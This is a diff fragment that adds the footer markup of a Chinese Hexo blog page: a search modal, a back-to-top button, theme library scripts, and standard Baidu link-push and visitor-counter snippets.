+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
